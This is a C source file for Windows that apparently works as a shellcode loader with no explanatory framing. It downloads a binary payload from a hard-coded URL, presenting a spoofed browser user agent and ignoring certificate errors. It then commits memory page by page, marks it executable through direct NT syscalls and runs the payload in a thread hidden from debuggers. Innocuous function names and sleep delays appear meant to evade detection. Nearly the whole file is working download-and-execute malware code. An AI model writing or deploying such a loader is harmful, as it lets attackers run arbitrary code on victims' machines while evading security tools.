#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include "sys.h"

#pragma comment (lib, "Wininet.lib")
#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#ifndef STATUS_SUCCESS 
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L) 
#endif

#define PAYLOAD	L"http://127.0.0.1:8080/calc-thread64.bin"

#define	SET_TO_MULTIPLE_OF_4096(X) (((X) + 4095) & (~4095))
#define	PAGE_SIZE 4096

const DWORD AllocationGranularity = 65536;
const DWORD PageSize = 4096;

BOOL GetDataFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {

		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}


BOOL LightWork(IN HANDLE hProcess, IN PVOID pPeople, IN SIZE_T sPeopleSize) {
	NTSTATUS STATUS = 0x00;
	SIZE_T sNewPayloadSize = SET_TO_MULTIPLE_OF_4096(sPeopleSize);
	SIZE_T sChunkSize = PAGE_SIZE;
	DWORD ii = sNewPayloadSize / PAGE_SIZE;
	DWORD dwOldPermissions = 0x00;
	PVOID pAddress = NULL, pTmpAddress = NULL;
	PBYTE pTmpPeople = (PBYTE)pPeople;
	HANDLE hThread = NULL;

	sNewPayloadSize += PAGE_SIZE;

	if ((STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY) != 0x00)) {
		return 1;
	}
	sNewPayloadSize -= PAGE_SIZE;
	pAddress = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
	pTmpAddress = pAddress;

	for (DWORD i = 0; i < ii; i++) {
		STATUS = NtAllocateVirtualMemory(hProcess, &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(STATUS)) {
			return FALSE;
		}
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	pTmpAddress = pAddress;
	for (DWORD i = 0; i < ii; i++) {
		STATUS = NtProtectVirtualMemory(hProcess, &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
		if (!NT_SUCCESS(STATUS)) {
			return FALSE;
		}
		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}


	pTmpAddress = pAddress;
	for (DWORD i = 0; i < ii; i++) {
		memcpy(pTmpAddress, pTmpPeople, PAGE_SIZE);
		pTmpPeople = (PBYTE)((ULONG_PTR)pTmpPeople + PAGE_SIZE);
		pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
	}



	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(STATUS)) {
		return FALSE;
	}

	if ((STATUS = NtWaitForSingleObject(hThread, FALSE, NULL)) != 0x00) {
		return 1;
	}
	return 1;
}

BOOL msgo(FLOAT ftMinutes) {

	// converting minutes to milliseconds
	DWORD	dwMilliSeconds = ftMinutes * 60000;
	HANDLE	hEvent = CreateEvent(NULL, NULL, NULL, NULL);

	(dwMilliSeconds / 1000);

	// sleeping for 'dwMilliSeconds' ms 
	MsgWaitForMultipleObjectsEx(1, &hEvent, dwMilliSeconds, QS_HOTKEY, NULL);

	CloseHandle(hEvent);

	return TRUE;
}


int main() {
	HANDLE hProcess = (HANDLE)-1;
	PBYTE Bytes = NULL;
	SIZE_T sPeopleSize;  // Initialize it with the actual payload size
	msgo(0.1);
	GetDataFromUrl(PAYLOAD, &Bytes, &sPeopleSize);
	msgo(0.1);
	if (!LightWork(hProcess, Bytes, sPeopleSize)) {
		return -1;
	}

	return 0;
}